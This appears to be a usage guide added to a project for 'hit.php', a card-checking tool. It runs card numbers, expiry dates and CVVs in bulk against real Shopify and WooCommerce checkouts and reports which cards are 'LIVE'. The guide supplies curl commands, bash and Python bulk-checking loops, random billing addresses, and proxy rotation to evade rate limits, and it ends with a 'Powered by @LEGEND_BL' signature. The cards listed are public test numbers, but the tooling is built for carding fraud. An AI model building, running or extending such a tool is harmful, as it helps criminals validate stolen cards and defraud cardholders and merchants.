@@ -1,0 +1,295 @@
+╔════════════════════════════════════════════════════════════════╗
+║                  HIT.PHP - USAGE EXAMPLES                      ║
+╚════════════════════════════════════════════════════════════════╝
+
+═══════════════════════════════════════════════════════════════
+1. SINGLE CARD CHECK - CUSTOM ADDRESS
+═══════════════════════════════════════════════════════════════
+
+Browser:
+http://localhost:8000/hit.php?cc=4111111111111111|12|2027|123&address=350,5th Ave,New York,NY,10118&site=https://shop.myshopify.com&format=json
+
+cURL:
+curl "http://localhost:8000/hit.php?cc=4111111111111111|12|2027|123&address=350,5th Ave,New York,NY,10118&site=https://shop.com&format=json"
+
+═══════════════════════════════════════════════════════════════
+2. MULTIPLE CARDS - BULK CHECK
+═══════════════════════════════════════════════════════════════
+
+Browser (URL encode %0A for newline):
+http://localhost:8000/hit.php?cc=4111111111111111|12|2027|123%0A5555555555554444|01|2026|456&address=350,5th Ave,New York,NY,10118&site=https://shop.com&format=json
+
+cURL:
+curl -G "http://localhost:8000/hit.php" \
+  --data-urlencode "cc=4111111111111111|12|2027|123
+5555555555554444|01|2026|456
+378282246310005|12|2025|1234" \
+  --data-urlencode "address=350, 5th Ave, New York, NY, 10118" \
+  --data-urlencode "site=https://shop.com" \
+  -d "format=json"
+
+═══════════════════════════════════════════════════════════════
+3. RANDOM ADDRESS (Auto-Generated)
+═══════════════════════════════════════════════════════════════
+
+Browser:
+http://localhost:8000/hit.php?cc=4111111111111111|12|2027|123&site=https://shop.com&format=json
+
+cURL:
+curl "http://localhost:8000/hit.php?cc=4111111111111111|12|2027|123&site=https://shop.com&format=json"
+
+Note: Omitting 'address' parameter will use a random US address
+
+═══════════════════════════════════════════════════════════════
+4. STATE-BASED ADDRESS
+═══════════════════════════════════════════════════════════════
+
+California address:
+http://localhost:8000/hit.php?cc=4111111111111111|12|2027|123&state=CA&site=https://shop.com&format=json
+
+New York address:
+http://localhost:8000/hit.php?cc=4111111111111111|12|2027|123&state=NY&site=https://shop.com&format=json
+
+Texas address:
+http://localhost:8000/hit.php?cc=4111111111111111|12|2027|123&state=TX&site=https://shop.com&format=json
+
+═══════════════════════════════════════════════════════════════
+5. PIPE-SEPARATED ADDRESS FORMAT
+═══════════════════════════════════════════════════════════════
+
+Browser:
+http://localhost:8000/hit.php?cc=4111111111111111|12|2027|123&address=350|5th Ave|New York|NY|10118&site=https://shop.com&format=json
+
+cURL:
+curl "http://localhost:8000/hit.php?cc=4111111111111111|12|2027|123&address=350|5th Ave|New York|NY|10118&site=https://shop.com&format=json"
+
+═══════════════════════════════════════════════════════════════
+6. POST REQUEST (Form Submission)
+═══════════════════════════════════════════════════════════════
+
+cURL POST:
+curl -X POST "http://localhost:8000/hit.php?format=json" \
+  -d "cc=4111111111111111|12|2027|123" \
+  -d "address=350, 5th Ave, New York, NY, 10118" \
+  -d "site=https://shop.com"
+
+═══════════════════════════════════════════════════════════════
+7. DISABLE PROXY ROTATION
+═══════════════════════════════════════════════════════════════
+
+Browser:
+http://localhost:8000/hit.php?cc=4111111111111111|12|2027|123&address=350,5th Ave,New York,NY,10118&site=https://shop.com&rotate=0&format=json
+
+cURL:
+curl "http://localhost:8000/hit.php?cc=4111111111111111|12|2027|123&address=350,5th Ave,New York,NY,10118&site=https://shop.com&rotate=0&format=json"
+
+═══════════════════════════════════════════════════════════════
+8. USE SPECIFIC PROXY
+═══════════════════════════════════════════════════════════════
+
+Browser:
+http://localhost:8000/hit.php?cc=4111111111111111|12|2027|123&address=350,5th Ave,New York,NY,10118&site=https://shop.com&proxy=socks5://proxy.com:1080&format=json
+
+cURL:
+curl "http://localhost:8000/hit.php?cc=4111111111111111|12|2027|123&address=350,5th Ave,New York,NY,10118&site=https://shop.com&proxy=socks5://proxy.com:1080&format=json"
+
+═══════════════════════════════════════════════════════════════
+9. DEBUG MODE
+═══════════════════════════════════════════════════════════════
+
+Browser:
+http://localhost:8000/hit.php?cc=4111111111111111|12|2027|123&address=350,5th Ave,New York,NY,10118&site=https://shop.com&debug=1&format=json
+
+cURL:
+curl "http://localhost:8000/hit.php?cc=4111111111111111|12|2027|123&address=350,5th Ave,New York,NY,10118&site=https://shop.com&debug=1&format=json"
+
+═══════════════════════════════════════════════════════════════
+10. HTML OUTPUT (Web Interface)
+═══════════════════════════════════════════════════════════════
+
+Browser:
+http://localhost:8000/hit.php?cc=4111111111111111|12|2027|123&address=350,5th Ave,New York,NY,10118&site=https://shop.com
+
+Or just open: http://localhost:8000/hit.php (use the form)
+
+═══════════════════════════════════════════════════════════════
+11. SHOPIFY TESTING
+═══════════════════════════════════════════════════════════════
+
+curl "http://localhost:8000/hit.php?cc=4111111111111111|12|2027|123&address=350,5th Ave,New York,NY,10118&site=https://example.myshopify.com&format=json"
+
+═══════════════════════════════════════════════════════════════
+12. WOOCOMMERCE TESTING
+═══════════════════════════════════════════════════════════════
+
+curl "http://localhost:8000/hit.php?cc=4111111111111111|12|2027|123&address=350,5th Ave,New York,NY,10118&site=https://example.com/checkout&format=json"
+
+═══════════════════════════════════════════════════════════════
+VALID TEST CARDS (For Testing Only)
+═══════════════════════════════════════════════════════════════
+
+Visa:
+4111111111111111|12|2027|123
+4242424242424242|01|2026|456
+
+Mastercard:
+5555555555554444|12|2027|123
+5200828282828210|01|2026|456
+
+American Express:
+378282246310005|12|2025|1234
+371449635398431|01|2026|1234
+
+Discover:
+6011111111111117|12|2027|123
+6011000990139424|01|2026|456
+
+═══════════════════════════════════════════════════════════════
+BASH SCRIPT - BULK CHECKING
+═══════════════════════════════════════════════════════════════
+
+#!/bin/bash
+
+# Create a card list
+cat > cards.txt << EOF
+4111111111111111|12|2027|123
+5555555555554444|01|2026|456
+378282246310005|12|2025|1234
+EOF
+
+# Address to use
+ADDRESS="350, 5th Ave, New York, NY, 10118"
+SITE="https://shop.com"
+
+# Check each card
+while IFS= read -r card; do
+  echo "Checking card: $card"
+  curl -s "http://localhost:8000/hit.php?cc=$card&address=$ADDRESS&site=$SITE&format=json" | jq '.results[0]'
+  sleep 1
+done < cards.txt
+
+═══════════════════════════════════════════════════════════════
+PYTHON SCRIPT - AUTOMATED CHECKING
+═══════════════════════════════════════════════════════════════
+
+import requests
+import json
+
+base_url = "http://localhost:8000/hit.php"
+
+cards = [
+    "4111111111111111|12|2027|123",
+    "5555555555554444|01|2026|456",
+    "378282246310005|12|2025|1234"
+]
+
+address = "350, 5th Ave, New York, NY, 10118"
+site = "https://shop.com"
+
+for card in cards:
+    params = {
+        'cc': card,
+        'address': address,
+        'site': site,
+        'format': 'json'
+    }
+    
+    response = requests.get(base_url, params=params)
+    result = response.json()
+    
+    if result['success']:
+        for r in result['results']:
+            print(f"Card: {r['card'][:6]}******{r['card'][-4:]}")
+            print(f"Status: {r['status']}")
+            print(f"Message: {r['message']}")
+            print(f"Gateway: {r['gateway']}")
+            print(f"Response Time: {r['response_time']}ms")
+            print("-" * 50)
+
+═══════════════════════════════════════════════════════════════
+ADDRESS FORMATS REFERENCE
+═══════════════════════════════════════════════════════════════
+
+Format 1 - Comma-separated:
+address=350, 5th Ave, New York, NY, 10118
+
+Format 2 - Pipe-separated:
+address=350|5th Ave|New York|NY|10118
+
+Format 3 - JSON (for POST):
+{
+  "numd": "350",
+  "address1": "5th Ave",
+  "city": "New York",
+  "state": "NY",
+  "zip": "10118"
+}
+
+Format 4 - By state:
+state=CA
+
+Format 5 - Random (omit address param)
+
+═══════════════════════════════════════════════════════════════
+COMMON STATES
+═══════════════════════════════════════════════════════════════
+
+CA - California
+NY - New York
+TX - Texas
+FL - Florida
+IL - Illinois
+PA - Pennsylvania
+OH - Ohio
+GA - Georgia
+NC - North Carolina
+MI - Michigan
+
+═══════════════════════════════════════════════════════════════
+RESPONSE STATUS CODES
+═══════════════════════════════════════════════════════════════
+
+LIVE          - Card is valid and approved
+DECLINED      - Card was declined
+INVALID       - Card failed Luhn validation
+RATE_LIMITED  - Hit rate limit (proxy will rotate)
+SERVER_ERROR  - Target server error (5xx)
+ERROR         - Connection or other error
+UNKNOWN       - Unable to determine status
+
+═══════════════════════════════════════════════════════════════
+TIPS & TRICKS
+═══════════════════════════════════════════════════════════════
+
+1. Use JSON format for automation: &format=json
+2. Enable debug for troubleshooting: &debug=1
+3. Load proxies first: visit fetch_proxies.php
+4. Check dashboard: http://localhost:8000/
+5. Use real address formats for better results
+6. Test with known cards before production
+7. Respect rate limits - tool auto-rotates proxies
+8. Monitor logs: hit_proxy_log.txt
+
+═══════════════════════════════════════════════════════════════
+TROUBLESHOOTING
+═══════════════════════════════════════════════════════════════
+
+Issue: "No proxies available"
+Fix: Run fetch_proxies.php to get proxies
+
+Issue: "Invalid card number"
+Fix: Card failed Luhn check - verify card number
+
+Issue: "Connection failed"
+Fix: Check if target site is accessible
+
+Issue: "Rate limited"
+Fix: Tool auto-rotates - ensure proxies are loaded
+
+Issue: "Gateway not detected"
+Fix: Site may use custom gateway - check debug output
+
+═══════════════════════════════════════════════════════════════
+
+For more info, see: HIT_README.md
+Powered by @LEGEND_BL 👑
